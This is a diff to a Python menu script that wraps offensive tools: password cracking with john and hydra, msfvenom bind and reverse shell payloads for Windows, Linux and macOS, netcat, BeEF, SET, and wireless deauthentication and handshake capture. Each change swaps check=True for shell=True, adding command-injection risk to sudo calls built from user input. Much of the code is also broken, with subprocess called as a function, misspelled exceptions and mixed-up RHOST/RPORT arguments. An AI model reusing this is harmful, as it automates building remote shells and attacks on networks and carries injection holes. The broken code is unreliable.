@@ -14,7 +14,7 @@ def offline_attack():
     john --format=NT --wordlist={} {}
     '''.format(wordlist,hashfile))
     try:
-        subprocess.Popen(['john','--format=NT','--wordlist='+wordlist,hashfile],text=True,check=True)
+        subprocess.Popen(['john','--format=NT','--wordlist='+wordlist,hashfile],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 def onlineAttack():
@@ -26,7 +26,7 @@ def onlineAttack():
     hydra -l {} -P {} {}://{} -t 4
     '''.format(username,wordlist,protocol,target))
     try:
-        subprocess.run(['hydra','-l',username,'-P',wordlist,protocol+'://'+target,'-t','4'],text=True,check=True)
+        subprocess.run(['hydra','-l',username,'-P',wordlist,protocol+'://'+target,'-t','4'],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 def passwdAttacks():
@@ -63,7 +63,7 @@ def custom_payload():
     msfvenom -p {} {} {} > {}
     '''.format(payload_type,payload_format,payload_options,payload_output))
     try:
-        subprocess.run(['msfvenom','-p',payload_type,payload_format,payload_options,'>',payload_output],text=True,check=True)
+        subprocess.run(['msfvenom','-p',payload_type,payload_format,payload_options,'>',payload_output],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 
@@ -75,7 +75,7 @@ def bind_shell(os):
         msfvenom -p windows/meterpreter/bind_tcp RHOST={} RPORT={} -f exe > shell.exe
         '''.format(rhost,rport))
         try:
-            subprocess.run(['msfvenom','-p','windows/meterpreter/bind_tcp','RPORT={}','RPORT={}'.format(rhost,rport),'-f','exe','>','shell.exe'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','windows/meterpreter/bind_tcp','RPORT={}','RPORT={}'.format(rhost,rport),'-f','exe','>','shell.exe'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif os=='linux':
@@ -86,7 +86,7 @@ def bind_shell(os):
         msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={} RPORT={} -f elf > shell.elf
         '''.format(rhost,rport))
         try:
-            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/bind_tcp','RHOST={}','RPORT={}'.format(rhost,rport),'-f','elf','>','shell.elf'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/bind_tcp','RHOST={}','RPORT={}'.format(rhost,rport),'-f','elf','>','shell.elf'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif os=='mac':
@@ -96,7 +96,7 @@ def bind_shell(os):
         msfvenom -p osx/x86/shell_bind_tcp RHOST={} RPORT={} -f macho > shell.macho
         '''.format(rhost,rport))
         try:
-            subprocess.run(['msfvenom','-p','osx/x86/shell_bind_tcp','RHOST={}','RPORT={}'.format(rhost,rport),'-f','macho','>','shell.macho'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','osx/x86/shell_bind_tcp','RHOST={}','RPORT={}'.format(rhost,rport),'-f','macho','>','shell.macho'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     else:
@@ -109,7 +109,7 @@ def reverse_shell(os):
         msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > shell.exe
         '''.format(lhost,lport))
         try:
-            subprocess.run(['msfvenom','-p','windows/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','exe','>','shell.exe'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','windows/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','exe','>','shell.exe'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif os=='linux':
@@ -119,7 +119,7 @@ def reverse_shell(os):
         msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > shell.elf
         '''.format(lhost,lport))
         try:
-            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','elf','>','shell.elf'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','elf','>','shell.elf'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif os=='mac':
@@ -129,7 +129,7 @@ def reverse_shell(os):
         msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho > shell.macho
         '''.format(lhost,lport))
         try:
-            subprocess.run(['msfvenom','-p','osx/x86/shell_reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','macho','>','shell.macho'],text=True,check=True)
+            subprocess.run(['msfvenom','-p','osx/x86/shell_reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','macho','>','shell.macho'],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     else:
@@ -174,19 +174,19 @@ def payload():
             print('Invalid option.')
 def postgresql():
     try:
-        subprocess.Popen(['sudo','service','postgresql','start'],text=True,check=True)
+        subprocess.Popen(['sudo','service','postgresql','start'],text=True,shell=True)
         print('PostgreSQL server started.')
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 def netcat(host,port,option):
     if option=='tcp':
         try:
-            subprocess.Popen(['sudo','nc',host,port],text=True,check=True)
+            subprocess.Popen(['sudo','nc',host,port],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif option=='udp':
         try:
-            subprocess.Popen(['sudo','nc','-u',host,port],text=True, check=True)
+            subprocess.Popen(['sudo','nc','-u',host,port],text=True, shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
 def utilities():
@@ -234,7 +234,7 @@ def private_ip():
     return private_ip
 def apache():
     try:
-        subprocess.Popen(['sudo','service','apache2','start'],text=True,check=True)
+        subprocess.Popen(['sudo','service','apache2','start'],text=True,shell=True)
         private_ip = private_ip()
         public_ip = public_ip()
         print('Apache server started.')
@@ -245,12 +245,12 @@ def apache():
         print('Encountered an error: ',str(error))
 def beef_framework():
     try:
-        subprocess.Popen(['sudo','beef-xss'],text=True,check=True)
+        subprocess.Popen(['sudo','beef-xss'],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 def setoolkit():
     try:
-        subprocess.Popen(['sudo','setoolkit'],text=True,check=True)
+        subprocess.Popen(['sudo','setoolkit'],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 
@@ -277,22 +277,22 @@ def socialEngineering():
 def nikto(host,port,if_ssl,output):
     if if_ssl=='-ssl':
         try:
-            subprocess.Popen(['sudo','nikto','-h',host,'-port',port,'-ssl','-output',output],text=True,check=True)
+            subprocess.Popen(['sudo','nikto','-h',host,'-port',port,'-ssl','-output',output],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif if_ssl=='no':
         try:
-            subprocess.Popen(['sudo','nikto','-h',host,'-port',port,'-output',output],text=True,check=True)
+            subprocess.Popen(['sudo','nikto','-h',host,'-port',port,'-output',output],text=True,shell=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
 def whois(domain):
     try:
-        subprocess.Popen(['whois',domain],text=True,check=True)
+        subprocess.Popen(['whois',domain],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 def recon_ng():
     try:
-        subprocess.Popen(['sudo','recon-ng'],text=True,check=True)
+        subprocess.Popen(['sudo','recon-ng'],text=True,shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 
@@ -302,51 +302,51 @@ def the_harvester(domain, shodan,source,takeover):
     if shodan=='-s' and source !='no':
         if takeover=='-t':
             try:
-                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t','-b',source],text=True,check=True)
+                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t','-b',source],text=True,shell=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
         elif takeover=='no':
             try:
-                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-b',source],text=True,check=True)
+                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-b',source],text=True,shell=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
                 
     elif shodan!='s' and source !='no':
         if takeover=='-t':
             try:
-                subprocess.Popen(['sudo','theHarvester','-d',domain,'-t','-b',source],check=True,text=True)
+                subprocess.Popen(['sudo','theHarvester','-d',domain,'-t','-b',source],shell=True,text=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
         elif takeover=='no':
             try:
-                subprocess.Popen(['sudo','theHarvester','-d',domain,'-b',source],check=True,text=True)
+                subprocess.Popen(['sudo','theHarvester','-d',domain,'-b',source],shell=True,text=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
     elif shodan=='-s' and source=='no':
         if takeover=='-t':
             try:
-                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t'],check=True,text=True)
+                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t'],shell=True,text=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
         elif takeover=='no':
             try:
-                subprocess(['sudo','theHarvester','-d',domain,'-s'],check=True,text=True)
+                subprocess(['sudo','theHarvester','-d',domain,'-s'],shell=True,text=True)
             except subprocess.SubprocessEror as error:
                 print('Encountered an error: ',str(error))
     elif shodan!='-s' and source=='no':
         if takeover=='-t':
             try:
-                subprocess(['sudo','theHarvester','-d',domain,'-t'],check=True,text=True)
+                subprocess(['sudo','theHarvester','-d',domain,'-t'],shell=True,text=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an error: ',str(error))
         elif takeover=='no':
             try:
-                subprocess(['sudo','theHarvester','-d',domain],check=True,text=True)
+                subprocess(['sudo','theHarvester','-d',domain],shell=True,text=True)
             except subprocess.SubprocessError as error:
                 print('Encountered an eror: ',str(error))
 def maltego():
     try:
-        subprocess.Popen(['sudo','maltego'],text=True, check=True)
+        subprocess.Popen(['sudo','maltego'],text=True, shell=True)
     except subprocess.SubprocessError as error:
         print('Encountered an error: ',str(error))
 
@@ -416,7 +416,7 @@ def osint():
 #-------Zenmap------
 def zenmap_menu():
     try:
-        subprocess.Popen(['sudo','zenmap'],text=True, check=True)
+        subprocess.Popen(['sudo','zenmap'],text=True, shell=True)
     except subprocess.subprocessError as error:
         print('Encountered error: ',str(error))
 
@@ -535,7 +535,7 @@ def crunch_passwd(min_chars, max_chars, characters, pattern, filename): # use cr
 
   
     try:
-        result = subprocess.Popen(command, check=True, text=True)
+        result = subprocess.Popen(command, shell=True, text=True)
         print(result.stdout.decode())
     except subprocess.CalledProcessError as e:
         print("Error occurred:",e.stderr.decode())
@@ -592,7 +592,7 @@ def captureHandshake(bssid, channel, filename, interface): # capture a four-way 
 
     
     try:
-        subprocess(command, check=True)
+        subprocess(command, shell=True)
     except subprocessError as e:
         print("Error running airodump-ng: ",e)
 
@@ -625,7 +625,7 @@ def deauthenticate(deauth_packets, bssid, client_mac, interface): #deauth attack
         ]
 
         
-        subprocess.Popen(command, check=True,text=True)
+        subprocess.Popen(command, shell=True,text=True)
         print("Deauthentication packets sent successfully.")
     except subprocess.SubprocessError as e:
         print("An error occurred while sending deauth packets:",str(e))
@@ -672,7 +672,7 @@ def sniff(interface): # start sniffing on all frequencies
         command = ['sudo','airodump-ng', interface, '-abg']
         
         
-        subprocess(command, check=True)
+        subprocess(command, shell=True)
     except subprocess.SubprocessError as e:
         print("An error occurred while running airodump-ng: ",str(e))
     except FileNotFoundError:
@@ -683,7 +683,7 @@ def sniff(interface): # start sniffing on all frequencies
 def monitor_mode(interface):
     try:
         
-        subprocess(['sudo','airmon-ng', 'start', interface], check=True)
+        subprocess(['sudo','airmon-ng', 'start', interface], shell=True)
         print("Successfully started monitor mode on",interface,'\n')
     except subprocess.CalledProcessError as e:
         print("Failed to start monitor mode on ",interface,': ',e)
@@ -708,13 +708,13 @@ def wirelessAttack(): # selection of options for wireless attacks
     
             try:
                 
-                check_output = subprocess.Popen(command, capture_output=True, text=True, check=True)
+                check_output = subprocess.Popen(command, capture_output=True, text=True, shell=True)
                 print("Processes that may interfere with airmon-ng:")
                 print(check_output.stdout)
         
                 
                 kill_command = ["airmon-ng", "check", "kill"]
-                kill_output = subprocess.Popen(kill_command, capture_output=True, text=True, check=True)
+                kill_output = subprocess.Popen(kill_command, capture_output=True, text=True, shell=True)
         
             
                 print(kill_output.stdout)
